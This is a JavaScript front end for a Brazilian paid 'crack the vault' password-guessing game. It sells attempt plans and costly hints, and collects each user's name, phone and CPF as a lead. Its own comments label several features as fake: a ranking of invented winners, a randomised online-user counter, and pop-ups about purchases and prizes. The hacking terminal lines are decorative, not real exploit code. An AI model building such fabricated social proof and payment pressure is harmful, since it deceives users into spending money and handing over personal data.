// --- CONFIGURAÇÃO DE SONS ---
const sfx = {
    type: document.getElementById('sfx-type'),
    error: document.getElementById('sfx-error'),
    win: document.getElementById('sfx-win'),
    pop: document.getElementById('sfx-pop')
};
sfx.pop.volume = 0.4;

function play(sound) {
    if (sound) { sound.currentTime = 0; sound.play().catch(() => {}); }
}

// --- EFEITO VIBRAR (Haptic Feedback) ---
function vibrar(ms = 50) {
    if (navigator.vibrate) navigator.vibrate(ms);
}

// --- EFEITO MATRIX (BACKGROUND) ---
const canvas = document.getElementById('matrix-canvas');
const ctx = canvas.getContext('2d');

function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&';
const fontSize = 14;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function drawMatrix() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    ctx.fillStyle = '#0F0';
    ctx.font = fontSize + 'px monospace';
    
    for (let i = 0; i < drops.length; i++) {
        const text = chars.charAt(Math.floor(Math.random() * chars.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}
setInterval(drawMatrix, 40);

// --- MÁSCARAS E INICIALIZAÇÃO ---
$(document).ready(() => {
    $('#input-tel').mask('(00) 00000-0000');
    $('#input-cpf').mask('000.000.000-00');
    atualizarRanking(); // Inicia o ranking fake
});

// --- DADOS ---
let usuario = JSON.parse(localStorage.getItem('openpix_user')) || null;
let historico = JSON.parse(localStorage.getItem('openpix_history')) || [];
let tokenVitoriaAtual = "";

// --- FUNÇÕES DE UI ---
function fecharModal(id) { document.getElementById(id).classList.add('hidden'); }

function abrirDicas() {
    vibrar();
    let textoPremio = $('#premio').text().replace('.', '').replace(',', '.');
    let valorPremio = parseFloat(textoPremio);

    let p1 = valorPremio * 0.05; 
    let p2 = valorPremio * 0.15; 
    let p3 = valorPremio * 0.50; 

    $('#val-dica-1').text('R$ ' + p1.toLocaleString('pt-BR', {minimumFractionDigits: 2}));
    $('#val-dica-2').text('R$ ' + p2.toLocaleString('pt-BR', {minimumFractionDigits: 2}));
    $('#val-dica-3').text('R$ ' + p3.toLocaleString('pt-BR', {minimumFractionDigits: 2}));

    $('#btn-dica-1').attr('onclick', `comprarDica(1, ${p1.toFixed(2)}, 'Pista 1 (5%)')`);
    $('#btn-dica-2').attr('onclick', `comprarDica(2, ${p2.toFixed(2)}, 'Pista 2 (15%)')`);
    $('#btn-dica-3').attr('onclick', `comprarDica(3, ${p3.toFixed(2)}, 'Pista 3 (50%)')`);

    document.getElementById('modal-dicas').classList.remove('hidden');
}

function verificarLogin() {
    vibrar();
    if (document.getElementById('senha').value.length !== 4) {
        Swal.fire({
            icon: 'warning',
            title: 'Senha Inválida',
            text: 'Digite uma senha de 4 dígitos.',
            confirmButtonColor: '#eab308'
        });
        return;
    }
    if (!usuario) document.getElementById('modal-cadastro').classList.remove('hidden');
    else document.getElementById('modal-planos').classList.remove('hidden');
}

function salvarCadastro(e) {
    e.preventDefault();
    vibrar();
    usuario = { nome: $('#input-nome').val(), tel: $('#input-tel').val(), cpf: $('#input-cpf').val() };
    localStorage.setItem('openpix_user', JSON.stringify(usuario));
    
    fetch('/salvar-lead', { 
        method: 'POST', 
        headers: {'Content-Type': 'application/json'}, 
        body: JSON.stringify(usuario) 
    });

    fecharModal('modal-cadastro');
    Swal.fire({
        icon: 'success',
        title: 'Acesso Permitido',
        text: 'Bem-vindo ao sistema OpenPix.',
        timer: 1500,
        showConfirmButton: false
    });
    
    document.getElementById('modal-planos').classList.remove('hidden');
}

function selecionarPlano(valor, chances, plano) {
    vibrar();
    fecharModal('modal-planos');
    $('#btn-texto').html('<i class="fas fa-circle-notch fa-spin"></i> VALIDANDO...');
    
    // Simula tempo de processamento
    setTimeout(() => {
        fetch('/registrar-venda', { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({ valor, plano }) 
        });
        iniciarHack();
    }, 1500);
}

async function comprarDica(nivel, valor, plano) {
    fecharModal('modal-dicas');
    
    // Substituindo confirm nativo pelo SweetAlert2
    const result = await Swal.fire({
        title: 'Investir na Dica?',
        text: `Valor do investimento: R$ ${valor}`,
        icon: 'question',
        showCancelButton: true,
        confirmButtonColor: '#22c55e',
        cancelButtonColor: '#d33',
        confirmButtonText: 'Sim, hackear!',
        cancelButtonText: 'Cancelar',
        background: '#1a1a1a',
        color: '#fff'
    });

    if(result.isConfirmed) {
        vibrar(100);
        const res = await fetch('/comprar-dica', { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({ nivel, valor, plano }) 
        });
        const data = await res.json();
        
        $('#terminal').removeClass('hidden').css('opacity', '1').empty();
        log(`INJETANDO EXPLOIT NÍVEL ${nivel}...`, "#eab308");
        await new Promise(r => setTimeout(r, 800));
        log(`ACESSO PARCIAL OBTIDO: [ ${data.dica} ]`, "#fff");
        
        Swal.fire({
            title: 'DICA REVELADA',
            text: `Os números da senha contém: ${data.dica}`,
            icon: 'success',
            background: '#000',
            color: '#4ade80'
        });
    }
}

// --- FUNÇÃO PARA ANIMAR NÚMEROS (CountUp Simples) ---
function animarValor(elementoId, valorFinal) {
    const elemento = document.getElementById(elementoId);
    if (!elemento) return;
    
    // Remove R$, pontos e vírgulas para pegar o número puro anterior
    let valorInicial = parseFloat(elemento.innerText.replace(/[^\d,]/g, '').replace(',', '.'));
    if (isNaN(valorInicial)) valorInicial = 0;
    
    const duracao = 1000; // 1 segundo
    const inicio = performance.now();
    
    requestAnimationFrame(function step(timestamp) {
        const progresso = (timestamp - inicio) / duracao;
        if (progresso < 1) {
            const valorAtual = valorInicial + (valorFinal - valorInicial) * progresso;
            elemento.innerText = valorAtual.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            requestAnimationFrame(step);
        } else {
            elemento.innerText = valorFinal.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        }
    });
}

// --- LÓGICA DO JOGO ---
async function log(m, c = "#4ade80") {
    play(sfx.type);
    const line = $(`<div class="log-line" style="color:${c}"><i class="fas fa-angle-right"></i> ${m}</div>`);
    $('#terminal').append(line);
    $('#terminal').scrollTop($('#terminal')[0].scrollHeight);
}

async function iniciarHack() {
    vibrar();
    const senhaTentativa = $('#senha').val();
    $('#btn-acao').prop('disabled', true);
    $('#terminal').removeClass('hidden').css('opacity', '1').empty();
    
    await log(`Validando hash criptográfico...`);
    await new Promise(r => setTimeout(r, 600));
    await log("Conectando ao mainframe seguro...");
    await new Promise(r => setTimeout(r, 800));
    await log(`Tentativa de quebra bruta: [ ${senhaTentativa} ]`);
    await new Promise(r => setTimeout(r, 1000));

    const res = await fetch('/tentar', { 
        method: 'POST', 
        headers: {'Content-Type': 'application/json'}, 
        body: JSON.stringify({ senha: senhaTentativa }) 
    });
    const data = await res.json();

    historico.push({ senha: senhaTentativa, ganhou: data.ganhou, data: new Date().toLocaleString('pt-BR') });
    localStorage.setItem('openpix_history', JSON.stringify(historico));

    if (data.ganhou) {
        // VITÓRIA
        play(sfx.win);
        vibrar([200, 100, 200]); // Vibração de vitória
        tokenVitoriaAtual = data.token;
        
        await log("ACESSO AUTORIZADO! FIREWALL DERRUBADO.", "#fbbf24");
        
        $('#valor-vitoria').text(data.premio.toLocaleString('pt-BR', { minimumFractionDigits: 2 }));
        $('#token-vitoria').text(data.token);
        
        setTimeout(() => { 
            document.getElementById('modal-vitoria').classList.remove('hidden'); 
            // Dispara confetes se quiser adicionar depois
        }, 1000);

    } else {
        // DERROTA
        play(sfx.error);
        vibrar(200); // Vibração de erro
        await log("ERRO: SENHA INCORRETA. ALARME SILENCIOSO.", "#ef4444");
        $('body').addClass('shake');
        
        // Anima o novo valor do prêmio
        animarValor('premio', data.novoPremio);
        
        setTimeout(() => {
            $('body').removeClass('shake');
            $('#terminal').css('opacity', '0').addClass('hidden');
            $('#senha').val('').prop('disabled', false).focus();
            $('#btn-acao').prop('disabled', false);
            $('#btn-texto').html('<i class="fas fa-unlock-alt"></i> ABRIR COFRE AGORA'); 
        }, 1500);
        
        Swal.fire({
            toast: true,
            position: 'top-end',
            icon: 'error',
            title: 'Senha Incorreta',
            text: 'O valor do prêmio acumulou!',
            showConfirmButton: false,
            timer: 3000,
            background: '#ef4444',
            color: '#fff'
        });
    }
}

// --- FUNÇÃO PARA SOLICITAR SAQUE ---
async function solicitarSaque() {
    vibrar();
    const pix = $('#pix-vitoria').val();
    
    if(!pix) {
        Swal.fire({ icon: 'error', title: 'Erro', text: 'Informe a Chave PIX.' });
        return;
    }
    
    const valor = parseFloat($('#valor-vitoria').text().replace('.','').replace(',','.'));
    
    await fetch('/solicitar-saque', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            token: tokenVitoriaAtual,
            pix: pix,
            nome: usuario.nome,
            cpf: usuario.cpf,
            valor: valor
        })
    });

    document.getElementById('modal-vitoria').classList.add('hidden');
    
    Swal.fire({
        icon: 'success',
        title: 'SAQUE PROCESSADO!',
        html: 'O valor deve cair na sua conta em até <b>10 minutos</b>.',
        confirmButtonText: 'VOLTAR AO INÍCIO',
        confirmButtonColor: '#22c55e'
    }).then(() => {
        location.reload();
    });
}

function abrirHistorico() {
    vibrar();
    const lista = $('#lista-historico').empty();
    if (!historico.length) {
        lista.html('<p class="text-center text-slate-600 mt-10 text-xs">Sem registros.</p>');
    } else {
        historico.slice().reverse().forEach(h => {
            lista.append(`
                <div class="bg-black/40 p-3 rounded-lg border border-slate-700 flex justify-between items-center hover:bg-black/60 transition mb-2">
                    <span class="font-mono text-lg text-white tracking-widest">${h.senha}</span>
                    <span class="text-[9px] font-bold px-2 py-1 rounded ${h.ganhou ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}">
                        ${h.ganhou ? 'DESBLOQUEADO' : 'BLOQUEADO'}
                    </span>
                </div>
            `);
        });
    }
    document.getElementById('modal-historico').classList.remove('hidden');
}

// --- RANKING FAKE E NOTIFICAÇÕES ---
const contadorEl = document.getElementById('contador-online');
setInterval(() => {
    let atual = parseInt(contadorEl.innerText);
    let variacao = Math.floor(Math.random() * 5) - 2; 
    let novo = atual + variacao;
    if (novo < 80) novo = 80;
    if (novo > 500) novo = 500;
    contadorEl.innerText = novo;
}, 3000);

const nomesRanking = ["João S.", "Maria O.", "Pedro A.", "Lucas F.", "Ana C.", "Carlos M.", "Bruna L."];
const valoresRanking = [150, 300, 50, 500, 1200, 80];

function gerarGanhadorFake() {
    const nome = nomesRanking[Math.floor(Math.random() * nomesRanking.length)];
    const valor = valoresRanking[Math.floor(Math.random() * valoresRanking.length)];
    const agora = new Date();
    const tempo = agora.getHours() + ":" + (agora.getMinutes()<10?'0':'') + agora.getMinutes();
    
    return `
        <div class="flex items-center justify-between bg-white/5 p-2 rounded border border-white/5">
            <div class="flex items-center gap-2">
                <div class="w-6 h-6 rounded-full bg-green-500/20 flex items-center justify-center text-[10px] text-green-500"><i class="fas fa-check"></i></div>
                <div class="text-[10px] text-slate-300 font-bold">${nome}</div>
            </div>
            <div class="text-[10px] text-green-400 font-mono font-bold">+ R$ ${valor},00 <span class="text-slate-600 ml-1 text-[8px]">${tempo}</span></div>
        </div>
    `;
}

function atualizarRanking() {
    const container = $('#ranking-container');
    // Preenche inicial
    for(let i=0; i<3; i++) container.append(gerarGanhadorFake());
    
    // Adiciona novos a cada X segundos
    setInterval(() => {
        const novo = $(gerarGanhadorFake()).hide().fadeIn();
        container.prepend(novo);
        if(container.children().length > 5) container.children().last().remove();
    }, 4500);
}

// Notificações Flutuantes (Popup topo)
const notificacoes = [
    { titulo: "Nova Compra", msg: "Alguém comprou 20 tentativas!", cor: "text-green-400" },
    { titulo: "Oportunidade", msg: "Prêmio acumulou para R$ 1.500,00", cor: "text-yellow-400" },
    { titulo: "Segurança", msg: "Um usuário errou a senha 3x.", cor: "text-red-400" }
];

function mostrarNotificacao() {
    const item = notificacoes[Math.floor(Math.random() * notificacoes.length)];
    $('#notificacao-titulo').text(item.titulo).attr('class', `font-bold ${item.cor}`);
    $('#notificacao-msg').text(item.msg);
    
    const notif = document.getElementById('notificacao-live');
    notif.classList.add('active');
    setTimeout(() => { notif.classList.remove('active'); }, 4000);
    
    setTimeout(mostrarNotificacao, Math.random() * 10000 + 5000);
}
setTimeout(mostrarNotificacao, 5000);
